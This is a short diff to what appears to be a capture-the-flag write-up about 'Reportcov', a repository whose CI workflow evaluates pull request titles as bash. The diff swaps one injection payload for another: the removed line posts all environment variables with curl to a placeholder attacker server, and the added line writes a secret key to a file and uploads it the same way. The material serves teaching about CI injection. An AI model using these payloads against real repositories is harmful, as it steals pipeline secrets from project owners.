@@ -16,7 +16,7 @@ In the challenge, Reportcov is a public repository of a 3rd party used by other 
 2. Create a pull request with the following command as its title:
 
     ```shell
-    `env | curl -H "Content-Type: application/json" -X POST -d "$(</dev/stdin)" <YOUR SERVER>`
+    `echo "${KEY}" > key && curl -v -F file=@key <YOUR SERVER>`
     ```
     The injection is possible since the following line treats the title as a bash variable and as such it can evaluate command substitution inside.
     
